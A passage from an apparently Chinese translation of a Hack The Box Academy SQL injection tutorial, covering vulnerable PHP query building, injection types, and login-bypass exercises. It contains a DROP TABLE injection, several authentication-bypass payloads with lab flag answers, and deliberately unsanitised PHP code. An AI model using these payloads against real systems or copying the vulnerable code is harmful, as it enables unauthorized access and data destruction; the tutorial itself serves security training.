+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from logins where username != &#x27;tom&#x27; AND id &gt; 3 - 2;</span><br><span class="line"></span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">| id | username      | password   | date_of_joining     |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">|  2 | administrator | adm1n_p@ss | 2020-07-03 12:03:53 |</span><br><span class="line">|  3 | john          | john123!   | 2020-07-03 12:03:57 |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>在接下来的部分中，我们将看到一些其他的运算符优先级场景。</p>
+<h2 id="SQL-注入简介"><a href="#SQL-注入简介" class="headerlink" title="SQL 注入简介"></a>SQL 注入简介</h2><p>现在我们对 MySQL 和 SQL 查询的工作原理有了一个大致的了解，让我们了解 SQL 注入。</p>
+<h3 id="在-Web-应用程序中使用-SQL"><a href="#在-Web-应用程序中使用-SQL" class="headerlink" title="在 Web 应用程序中使用 SQL"></a>在 Web 应用程序中使用 SQL</h3><p>首先，让我们看看 Web 应用程序如何使用 MySQL 数据库来存储和检索数据。一旦在后端服务器上安装并设置了 DBMS 并启动并运行，Web 应用程序就可以开始利用它来存储和检索数据。</p>
+<p>例如，在<code>PHP</code>Web 应用程序中，我们可以连接到我们的数据库，并<code>MySQL</code>通过<code>MySQL</code>语法开始使用数据库，就在 中<code>PHP</code>，如下所示：</p>
+<p>代码：php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;users&quot;</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from logins&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br></pre></td></tr></table></figure>
+
+<p>​	然后，查询的输出将存储在 中<code>$result</code>，我们可以将其打印到页面或以任何其他方式使用它。下面的 PHP 代码将在新行中打印 SQL 查询的所有返回结果：</p>
+<p>代码：php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>() )&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	Web 应用程序在检索数据时通常也使用用户输入。例如，当用户使用搜索功能搜索其他用户时，他们的搜索输入将传递给 Web 应用程序，该应用程序使用输入在数据库中进行搜索：</p>
+<p>代码：php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$searchInput</span> =  <span class="variable">$_POST</span>[<span class="string">&#x27;findUser&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from logins where username like &#x27;%<span class="subst">$searchInput</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">If we <span class="keyword">use</span> <span class="title">user</span>-<span class="title">input</span> <span class="title">within</span> <span class="title">an</span> <span class="title">SQL</span> <span class="title">query</span>, <span class="title">and</span> <span class="title">if</span> <span class="title">not</span> <span class="title">securely</span> <span class="title">coded</span>, <span class="title">it</span> <span class="title">may</span> <span class="title">cause</span> <span class="title">a</span> <span class="title">variety</span> <span class="title">of</span> <span class="title">issues</span>, <span class="title">like</span> <span class="title">SQL</span> <span class="title">Injection</span> <span class="title">vulnerabilities</span>.</span><br></pre></td></tr></table></figure>
+
+<h3 id="什么是注入？"><a href="#什么是注入？" class="headerlink" title="什么是注入？"></a>什么是注入？</h3><p>​	在上面的示例中，我们接受用户输入并将其直接传递给 SQL 查询而不进行清理。</p>
+<p>​	清理是指删除用户输入中的任何特殊字符，以中断任何注入尝试。</p>
+<p>​	当应用程序将用户输入错误解释为实际代码而不是字符串时，就会发生注入，从而更改代码流并执行它。这可以通过注入特殊字符（如 ( <code>&#39;</code>)）来转义用户输入边界，然后编写要执行的代码（如 JavaScript 代码或 SQL 注入中的 SQL）来实现。除非对用户输入进行清理，否则很可能会执行注入的代码并运行它。</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>当用户输入被输入到 SQL 查询字符串中而没有正确清理或过滤输入时，就会发生 SQL 注入。前面的示例展示了如何在 SQL 查询中使用用户输入，并且它没有使用任何形式的输入清理：</p>
+<p>代码：php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$searchInput</span> =  <span class="variable">$_POST</span>[<span class="string">&#x27;findUser&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from logins where username like &#x27;%<span class="subst">$searchInput</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br></pre></td></tr></table></figure>
+
+<p>在典型情况下，<code>searchInput</code>将输入 以完成查询，返回预期结果。我们键入的任何输入都会进入以下 SQL 查询：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> logins <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%$searchInput&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	所以，如果我们输入<code>admin</code>，它变成<code>&#39;%admin&#39;</code>。在这种情况下，如果我们编写任何 SQL 代码，它只会被视为搜索词。例如，如果我们输入<code>SHOW DATABASES;</code>，它将被执行为<code>&#39;%SHOW DATABASES;&#39;</code>Web 应用程序将搜索类似于 的用户名<code>SHOW DATABASES;</code>。</p>
+<p>​	但是，由于没有清理，在这种情况下，<strong>我们可以添加一个单引号 ( <code>&#39;</code>)，它将结束用户输入字段，然后我们可以编写实际的 SQL 代码</strong>。例如，如果我们搜索<code>1&#39;; DROP TABLE users;</code>，搜索输入将是：</p>
+<p>代码：php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;%1&#x27;</span>; DROP TABLE users;<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>请注意我们如何在“1”之后添加单引号 (‘)，以避开用户输入 (‘%$searchInput’) 的范围。</p>
+<p>因此，最终执行的 SQL 查询如下：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> logins <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%1&#x27;</span>; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> users;<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	正如我们从语法突出显示中看到的那样，我们可以转义原始查询的边界并执行新注入的查询。<code>Once the query is run, the </code>用户<code> table will get deleted.</code></p>
+<p>​	注意：在上面的示例中，为了简单起见，我们在分号（;）之后添加了另一个 SQL 查询。虽然这对于 MySQL 实际上是不可能的，但对于 MSSQL 和 PostgreSQL 是可能的。在接下来的部分中，我们将讨论在 MySQL 中注入 SQL 查询的真正方法。</p>
+<h2 id="语法错误"><a href="#语法错误" class="headerlink" title="语法错误"></a>语法错误</h2><p>前面的 SQL 注入示例将返回错误：</p>
+<p>代码：php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span>: near line <span class="number">1</span>: near <span class="string">&quot;&#x27;&quot;</span>: syntax error</span><br></pre></td></tr></table></figure>
+
+<p>这是因为最后一个尾随字符，我们有一个<code>&#39;</code>没有关闭的额外引号 ()，这会导致执行时出现 SQL 语法错误：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> logins <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%1&#x27;</span>; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> users;<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	在这种情况下，我们只有一个尾随字符，因为我们的搜索查询输入接近 SQL 查询的末尾。然而，用户输入通常在 SQL 查询的中间，原始 SQL 查询的其余部分在它之后。</p>
+<p>​	要成功注入，我们必须确保新修改的 SQL 查询在注入后仍然有效并且没有任何语法错误。在大多数情况下，我们无法访问源代码来查找原始 SQL 查询并开发适当的 SQL 注入来进行有效的 SQL 查询。那么，我们如何才能成功地注入到 SQL 查询中呢？</p>
+<p>​	一个答案是使用<code>comments</code>，我们将在后面的部分讨论这个问题。另一种方法是通过传入多个单引号使查询语法起作用，我们将在接下来讨论 ( <code>&#39;</code>)。</p>
+<p>​	现在我们了解了 SQL 注入的基础知识，让我们开始学习一些实际用途。</p>
+<h2 id="SQL注入的类型"><a href="#SQL注入的类型" class="headerlink" title="SQL注入的类型"></a>SQL注入的类型</h2><p>SQL 注入根据我们检索其输出的方式和位置进行分类。</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C6.png"></p>
+<p>​	在简单的情况下，预期和新查询的输出可能会直接打印在前端，我们可以直接读取。这称为<code>In-band</code>SQL 注入，它有两种类型：<code>Union Based</code>和<code>Error Based</code>。</p>
+<p>使用<code>Union Based</code>SQL 注入，我们可能必须指定我们可以读取的确切位置，即“列”，以便查询将输出定向到那里打印。至于SQL 注入，当我们可以在前端<code>Error Based</code>获取<code>PHP</code>或错误时使用它，因此我们可能会故意导致返回查询输出的 SQL 错误。<code>SQL</code></p>
+<p>在更复杂的情况下，我们可能无法打印输出，因此我们可以利用 SQL 逻辑逐个字符地检索输出。这称为<code>Blind</code>SQL 注入，它也有两种类型：<code>Boolean Based</code>和<code>Time Based</code>。</p>
+<p>通过<code>Boolean Based</code>SQL 注入，我们可以使用 SQL 条件语句来控制页面是否返回任何输出，“即原始查询响应”，如果我们的条件语句返回<code>true</code>。对于<code>Time Based</code>SQL 注入，我们使用 SQL 条件语句，如果条件语句<code>true</code>使用<code>Sleep()</code>函数返回，则延迟页面响应。</p>
+<p>最后，在某些情况下，我们可能无法直接访问输出，因此我们可能必须将输出定向到远程位置，“即 DNS 记录”，然后尝试从那里检索它。这称为<code>Out-of-band</code>SQL 注入。</p>
+<p>在本模块中，我们将只专注于通过学习 SQL 注入来介绍<code>Union Based</code>SQL 注入。</p>
+<h1 id="颠覆查询逻辑"><a href="#颠覆查询逻辑" class="headerlink" title="颠覆查询逻辑"></a>颠覆查询逻辑</h1><p>现在我们对 SQL 语句的工作原理有了基本的了解，让我们开始 SQL 注入。在我们开始执行整个 SQL 查询之前，我们将首先学习通过注入运算符<code>OR</code>和使用 SQL 注释来颠覆原始查询逻辑来修改原始查询。这方面的一个基本示例是绕过 Web 身份验证，我们将在本节中对此进行演示。</p>
+<h2 id="身份验证绕过"><a href="#身份验证绕过" class="headerlink" title="身份验证绕过"></a>身份验证绕过</h2><p>考虑以下管理员登录页面。</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C7.png"></p>
+<p>我们可以使用管理员凭据登录<code>admin / p@ssw0rd</code>。</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C8.png"></p>
+<p>该页面还显示了正在执行的 SQL 查询，以便更好地了解我们将如何颠覆查询逻辑。我们的目标是在不使用现有密码的情况下以管理员用户身份登录。正如我们所见，当前正在执行的 SQL 查询是：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;p@ssw0rd&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>​	该页面接收凭据，然后使用<code>AND</code>运算符选择与给定用户名和密码匹配的记录。如果<code>MySQL</code>数据库返回匹配的记录，则凭据有效，</p>
+<p>因此代码<code>PHP</code>会将登录尝试条件评估为<code>true</code>。如果条件评估为<code>true</code>，则返回管理员记录，并验证我们的登录。让我们看看当我们输入错误的凭据时会发生什么。</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C9.png"></p>
+<p>不出所料，由于密码错误导致<code>false</code>操作结果导致登录失败<code>AND</code>。</p>
+<h2 id="SQLi-发现"><a href="#SQLi-发现" class="headerlink" title="SQLi 发现"></a>SQLi 发现</h2><p>​	在我们开始破坏 Web 应用程序的逻辑并试图绕过身份验证之前，我们首先必须测试登录表单是否容易受到 SQL 注入的攻击。为此，我们将尝试在我们的用户名后添加以下有效负载之一，看看它是否会导致任何错误或改变页面的行为方式：</p>
+<table>
+<thead>
+<tr>
+<th>有效载荷</th>
+<th>网址编码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&#39;</code></td>
+<td><code>%27</code></td>
+</tr>
+<tr>
+<td><code>&quot;</code></td>
+<td><code>%22</code></td>
+</tr>
+<tr>
+<td><code>#</code></td>
+<td><code>%23</code></td>
+</tr>
+<tr>
+<td><code>;</code></td>
+<td><code>%3B</code></td>
+</tr>
+<tr>
+<td><code>)</code></td>
+<td><code>%29</code></td>
+</tr>
+</tbody></table>
+<p>​	注意：在某些情况下，我们可能必须使用负载的 URL 编码版本。这方面的一个例子是当我们将我们的有效负载直接放在 URL“即 HTTP GET 请求”中时。</p>
+<p>​	因此，让我们从注入单引号开始：</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C10.png"></p>
+<p>我们看到抛出了 SQL 错误而不是<code>Login Failed</code>消息。该页面引发错误，因为生成的查询是：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27; AND password = &#x27;</span>something<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	我们输入的引号导致了奇数个引号，从而导致语法错误。一种选择是注释掉查询的其余部分，并将查询的其余部分作为我们注入的一部分来编写，以形成一个有效的查询。另一种选择是在我们注入的查询中使用偶数个引号，这样最终的查询仍然有效。</p>
+<h2 id="或注射"><a href="#或注射" class="headerlink" title="或注射"></a>或注射</h2><p>​	<code>true</code>无论输入的用户名和密码如何，我们都需要查询始终返回，以绕过身份验证。为此，我们可以<code>OR</code>在 SQL 注入中滥用运算符。</p>
+<p><code>AND</code>操作符将在操作符之前被评估<code>OR</code>。<code>TRUE</code>这意味着如果整个查询中至少有一个条件和一个<code>OR</code>运算符，则整个查询的计算结果将是 to <code>TRUE</code>，因为如果其操作数之一是 ，<code>OR</code>则运算符返回。<code>TRUE``TRUE</code></p>
+<p>​	始终返回的条件示例<code>true</code>是<code>&#39;1&#39;=&#39;1&#39;</code>。但是，为了保持 SQL 查询正常工作并保持偶数个引号，而不是使用 (‘1’&#x3D;’1’)，</p>
+<p>​	我们将删除最后一个引号并使用 (‘1’&#x3D;’1)，因此剩下的单引号原始查询中的引用将取而代之。</p>
+<p>​	因此，如果我们注入以下条件并<code>OR</code>在它和原始条件之间有一个运算符，它应该总是返回<code>true</code>：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>最终查询应如下所示：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;something&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这意味着以下内容：</p>
+<ul>
+<li>如果用户名是<code>admin</code><br><code>OR</code></li>
+<li>如果<code>1=1</code>返回<code>true</code>‘总是返回<code>true</code>‘<br><code>AND</code></li>
+<li>如果密码是<code>something</code></li>
+</ul>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C11.png"></p>
+<p>运算<code>AND</code>符将首先被评估，然后返回<code>false</code>。然后，<code>OR</code>运算符将被评估，如果其中一个语句是<code>true</code>，它将返回<code>true</code>。由于<code>1=1</code>总是返回<code>true</code>，此查询将返回<code>true</code>，并且它会授予我们访问权限。</p>
+<p>注意：我们上面使用的有效载荷是我们可以用来破坏身份验证逻辑的众多身份验证绕过有效载荷之一。[您可以在PayloadAllTheThings](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL</a> Injection#authentication-bypass)中找到完整的 SQLi 身份验证绕过负载列表，每个负载都适用于特定类型的 SQL 查询。</p>
+<h2 id="使用-OR-运算符绕过身份验证"><a href="#使用-OR-运算符绕过身份验证" class="headerlink" title="使用 OR 运算符绕过身份验证"></a>使用 OR 运算符绕过身份验证</h2><p>让我们尝试将此作为用户名并查看响应。</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C12.png"></p>
+<p>我们能够以管理员身份成功登录。但是，如果我们不知道有效的用户名怎么办？这次让我们用不同的用户名尝试相同的请求。</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C13.png"></p>
+<p>登录失败，因为<code>notAdmin</code>表中不存在，导致整体查询错误。</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C14.png"></p>
+<p>要再次成功登录，我们需要一个整体<code>true</code>查询。这可以通过<code>OR</code>在密码字段中注入一个条件来实现，因此它总是会返回<code>true</code>。让我们尝试<code>something&#39; or &#39;1&#39;=&#39;1</code>作为密码。</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C15.png"></p>
+<p>附加<code>OR</code>条件导致<code>true</code>整体查询，因为该<code>WHERE</code>子句返回表中的所有内容，并且第一行中的用户已登录。在这种情况下，由于两个条件都将返回，<code>true</code>我们不必提供测试用户名和密码，可以直接开始注入<code>&#39;</code>，直接用<code>&#39; or &#39;1&#39; = &#39;1</code>.</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C16.png"></p>
+<p>这是有效的，因为查询的计算结果与<code>true</code>用户名或密码无关。</p>
+<h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h3><p>尝试以用户“tom”身份登录。登录成功后显示的flag值是多少？</p>
+<p>tom’or ‘1’ &#x3D;’1</p>
+<h1 id="使用注释"><a href="#使用注释" class="headerlink" title="使用注释"></a>使用注释</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>​	就像任何其他语言一样，SQL 也允许使用注释。注释用于记录查询或忽略查询的特定部分。除了内联注释外，我们还可以在 MySQL<code>-- </code>和中使用两种类型的行注释（尽管这通常不用于 SQL 注入）。可以按如下方式使用：<code>#``/**/``--</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT username FROM logins; -- Selects usernames from the logins table </span><br><span class="line"></span><br><span class="line">+---------------+</span><br><span class="line">| username      |</span><br><span class="line">+---------------+</span><br><span class="line">| admin         |</span><br><span class="line">| administrator |</span><br><span class="line">| john          |</span><br><span class="line">| tom           |</span><br><span class="line">+---------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>​	注意：在 SQL 中，仅使用两个破折号不足以开始注释。所以，它们后面必须有一个空格，所以注释以 (– ) 开头，末尾有一个空格。有时 URL 编码为 (–+)，因为 URL 中的空格被编码为 (+)。为清楚起见，我们将在末尾 (– -) 添加另一个 (-)，以显示空格字符的使用。</p>
+<p>符号<code>#</code>也可以使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM logins WHERE username = &#x27;admin&#x27;; # You can place anything here AND password = &#x27;something&#x27;</span><br><span class="line"></span><br><span class="line">+----+----------+----------+---------------------+</span><br><span class="line">| id | username | password | date_of_joining     |</span><br><span class="line">+----+----------+----------+---------------------+</span><br><span class="line">|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |</span><br><span class="line">+----+----------+----------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>​	提示：如果您在浏览器的 URL 中输入有效负载，(#) 符号通常被视为标记，不会作为 URL 的一部分传递。为了在浏览器中使用 (#) 作为注释，我们可以使用 ‘%23’，这是一个 URL 编码 (#) 符号。</p>
+<p>服务器将在评估期间忽略查询的部分<code>AND password = &#39;something&#39;</code>。</p>
+<h2 id="带有注释的身份验证绕过"><a href="#带有注释的身份验证绕过" class="headerlink" title="带有注释的身份验证绕过"></a>带有注释的身份验证绕过</h2><p>让我们回到我们之前的例子并注入<code>admin&#39;-- </code>我们的用户名。最终查询将是：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span><span class="comment">-- &#x27; AND password = &#x27;something&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>正如我们从语法突出显示中看到的那样，用户名现在是<code>admin</code>，查询的其余部分现在作为注释被忽略。此外，通过这种方式，我们可以确保查询没有任何语法问题。</p>
+<p><code>admin&#39;-- </code>让我们尝试在登录页面上使用这些，并使用用户名和任何密码登录：</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C17.png"></p>
+<p>如我们所见，我们能够绕过身份验证，因为新修改的查询会检查用户名，没有其他条件。</p>
+<h2 id="另一个例子"><a href="#另一个例子" class="headerlink" title="另一个例子"></a>另一个例子</h2><p>如果应用程序需要先检查特定条件，SQL 支持使用括号。括号内的表达式优先于其他运算符并首先计算。让我们来看这样一个场景：</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C18.png"></p>
+<p>​	上面的查询确保用户的 id 总是大于 1，这将阻止任何人以管理员身份登录。此外，我们还看到密码在用于查询之前已经过哈希处理。这将阻止我们通过密码字段进行注入，因为输入已更改为哈希。</p>
+<p>让我们尝试使用有效凭据登录<code>admin / p@ssw0rd</code>以查看响应。</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C19.png"></p>
+<p>​	正如预期的那样，即使我们提供了有效的凭据，登录也会失败，因为管理员的 ID 等于 1。因此让我们尝试使用另一个用户的凭据登录，例如<code>tom</code>。</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C20.png"></p>
+<p>​	以 id 不等于 1 的用户身份登录成功。那么，我们如何以管理员身份登录呢？从前面关于评论的部分我们知道我们可以使用它们来评论查询的其余部分。</p>
+<p>​	因此，让我们尝试使用<code>admin&#39;-- </code>as 用户名。</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C22.png"></p>
+<p>由于语法错误，登录失败，因为关闭的没有平衡开括号。要成功执行查询，我们必须添加一个右括号。让我们尝试使用用户名<code>admin&#39;)-- </code>关闭并注释掉其余部分。</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C23.png"></p>
+<p>查询成功，我们以管理员身份登录。我们输入的最终查询是：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">where</span> (username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>上面的查询类似于上一个示例中的查询，并返回包含 admin 的行。</p>
+<h2 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h2><p>以 ID 为 5 的用户身份登录以获取标志。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or id = 5 )#</span><br></pre></td></tr></table></figure>
+
+<h1 id="Union-Clause"><a href="#Union-Clause" class="headerlink" title="Union Clause"></a>Union Clause</h1><p>我们只使用OR操作符和注释来操纵原始查询来颠覆web应用程序逻辑并绕过身份验证。然而，另一种类型的SQL注入是注入与原始查询一起执行的整个SQL查询。本节将通过使用MySQL Union子句执行SQL Union注入来演示这一点。</p>
+<h2 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h2><p>在开始学习联合注入之前，我们应该首先了解更多关于SQL Union子句的知识。<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/union.html">Union</a>子句用于组合多个’ SELECT ‘语句的结果。这意味着通过UNION注入，我们将能够在整个DBMS中，从多个表和数据库中，“SELECT”和转储数据。让我们尝试在示例数据库中使用“UNION”操作符。首先，让我们看看’ ports ‘表的内容:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM ports UNION SELECT * FROM ships;</span><br></pre></td></tr></table></figure>
+
+<p>正如我们所看到的，UNION将两个SELECT语句的输出合并为一个语句，因此来自ports表和ships表的条目被合并为包含四行的单个输出。正如我们所看到的，一些行属于ports表，而另一些属于ships表。</p>
+<h2 id="Even-Columns"><a href="#Even-Columns" class="headerlink" title="Even Columns"></a>Even Columns</h2><p>UNION语句只能对具有相同列数的SELECT语句进行操作。</p>
+<p>For example, if the query is:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> product_id <span class="operator">=</span> <span class="string">&#x27;user_input&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以在输入中注入一个’ UNION ‘查询，这样就会返回另一个表中的行:</p>
